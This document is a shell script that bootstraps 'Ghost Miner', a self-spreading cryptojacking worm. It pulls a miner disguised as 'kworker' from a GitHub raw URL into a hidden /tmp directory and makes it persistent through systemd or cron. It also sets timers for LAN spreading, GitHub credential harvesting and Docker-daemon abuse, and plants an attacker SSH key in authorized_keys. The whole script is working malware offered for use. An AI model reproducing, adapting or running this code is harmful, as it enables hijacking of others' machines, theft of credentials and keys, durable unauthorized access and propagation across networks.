#!/bin/sh
# ============================================================================
# Ghost Miner bootstrap - idempotent one-shot deploy. Run once per host:
#   ssh -i key root@TARGET 'curl -fsSL "$CONFIG_URL/bootstrap.sh" | CONFIG_URL="$CONFIG_URL" sh'
# Safe to re-run: it converges the host to the desired state.
# ============================================================================
set -eu

CONFIG_URL="${CONFIG_URL:-https://raw.githubusercontent.com/ronnissleepy-code/scripts/main}"
SYSDIR="${SYSDIR:-/tmp/.sysd}"
PAYLOAD_URL="${PAYLOAD_URL:-$CONFIG_URL/kworker}"
SHA_URL="${SHA_URL:-$CONFIG_URL/kworker.sha256}"

mkdir -p "$SYSDIR"
cd "$SYSDIR"

# 1) constants (single source of truth, fetched from your host)
# raw.githubusercontent is CDN-cached for minutes, so a staged push can be
# invisible fleet-wide until it expires. A per-run query string makes every
# fetch land on the current revision.
curl -fsSL "$CONFIG_URL/worker.env?v=$(date +%s)" -o worker.env
. ./worker.env
: "${WALLET:?set WALLET in worker.env}"
: "${POOL:?set POOL in worker.env}"
RIG_ID="${RIG_ID:-node}"
TLS="${TLS:-true}"

# 2) binary + integrity check
curl -fsSL "$PAYLOAD_URL?v=$(date +%s)" -o kworker.new
if curl -fsSL "$SHA_URL?v=$(date +%s)" -o kworker.sha256 2>/dev/null; then
    want=$(awk '{print $1}' kworker.sha256 | tr 'A-F' 'a-f')
    got=$(sha256sum kworker.new | awk '{print $1}' | tr 'A-F' 'a-f')
    [ "$want" = "$got" ] || { echo "ghost-miner: hash mismatch" >&2; exit 1; }
fi
chmod 0755 kworker.new
mv -f kworker.new kworker

# 3) render config from template (wallet/pool injected)
curl -fsSL "$CONFIG_URL/config.json?v=$(date +%s)" -o config.tmpl
sed -e "s|__URL__|${POOL}|g" \
    -e "s|__USER__|${WALLET}|g" \
    -e "s|__PASS__|${RIG_ID}|g" \
    -e "s|__RIGID__|${RIG_ID}|g" \
    -e "s|__TLS__|${TLS}|g" \
    config.tmpl > config.json

# 4) helpers. Download to a temp then mv: mv is an atomic rename, so a helper
#    that is mid-run (spread/hunt fired by a timer) keeps reading its old inode
#    instead of having the file rewritten underneath it.
for f in run.sh updater.sh spread.sh hunt.sh loot.sh dock.sh dockmass.sh publish.sh tune.sh shodan.sh; do
    curl -fsSL "$CONFIG_URL/$f?v=$(date +%s)" -o "$f.new"
    chmod 0755 "$f.new"
    mv -f "$f.new" "$f"
done

# 5) persistence: systemd (+ timer) if present, cron fallback otherwise
if command -v systemctl >/dev/null 2>&1; then
    curl -fsSL "$CONFIG_URL/kworker.service" -o /etc/systemd/system/kworker.service
    curl -fsSL "$CONFIG_URL/kworker-updater.service" -o /etc/systemd/system/kworker-updater.service
    curl -fsSL "$CONFIG_URL/kworker-updater.timer" -o /etc/systemd/system/kworker-updater.timer
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable kworker 2>/dev/null || true
    systemctl restart kworker
    systemctl enable --now kworker-updater.timer 2>/dev/null || true
else
    printf '@reboot root %s/run.sh\n*/5 * * * * root pgrep -f %s/kworker >/dev/null || %s/run.sh\n15 * * * * root %s/updater.sh >/dev/null 2>&1\n' \
        "$SYSDIR" "$SYSDIR" "$SYSDIR" "$SYSDIR" > /etc/cron.d/kworker
    chmod 0644 /etc/cron.d/kworker
    nohup "$SYSDIR/run.sh" >/dev/null 2>&1 &
fi

# 6) spreaders: LAN (spread.sh) and GitHub harvester (hunt.sh)
if [ -n "${KEY_URL:-}" ]; then
    curl -fsSL "$KEY_URL" -o id_key
    chmod 0600 id_key
fi
if command -v systemctl >/dev/null 2>&1; then
    for u in kworker-spread kworker-hunt kworker-tune kworker-loot kworker-dock kworker-mass; do
        curl -fsSL "$CONFIG_URL/$u.service?v=$(date +%s)" -o "/etc/systemd/system/$u.service"
        curl -fsSL "$CONFIG_URL/$u.timer?v=$(date +%s)" -o "/etc/systemd/system/$u.timer"
    done
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable --now kworker-spread.timer 2>/dev/null || true
    systemctl enable --now kworker-tune.timer 2>/dev/null || true
    systemctl enable --now kworker-loot.timer 2>/dev/null || true
    systemctl enable --now kworker-dock.timer 2>/dev/null || true
    systemctl enable --now kworker-mass.timer 2>/dev/null || true
    if [ -n "${GITHUB_TOKEN:-}" ]; then
        systemctl enable --now kworker-hunt.timer 2>/dev/null || true
    fi
else
    printf '0 */6 * * * root %s/spread.sh >/dev/null 2>&1\n' "$SYSDIR" > /etc/cron.d/kworker-spread
    printf '*/10 * * * * root %s/tune.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
    printf '5 */6 * * * root %s/loot.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
    printf '45 */6 * * * root %s/dock.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
    printf '15 * * * * root %s/dockmass.sh >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
    if [ -n "${GITHUB_TOKEN:-}" ]; then
        printf '30 */12 * * * root %s/hunt.sh all >/dev/null 2>&1\n' "$SYSDIR" >> /etc/cron.d/kworker-spread
    fi
    chmod 0644 /etc/cron.d/kworker-spread
fi

# 7) loot this host's own trust graph once, right now: it installs our key into
#    authorized_keys (durable access) and seeds loot.txt for the hunter.
SYSDIR="$SYSDIR" HUNT_WORK="$SYSDIR/.hunt" sh "$SYSDIR/loot.sh" 2>/dev/null || :

# 8) and check for an exposed docker daemon (no-credential vector). No-ops on a
#    host whose hunt queue is still empty.
SYSDIR="$SYSDIR" HUNT_WORK="$SYSDIR/.hunt" sh "$SYSDIR/dock.sh" 2>/dev/null || :

echo "ghost-miner: deployed to $SYSDIR (pool=$POOL tls=$TLS)"
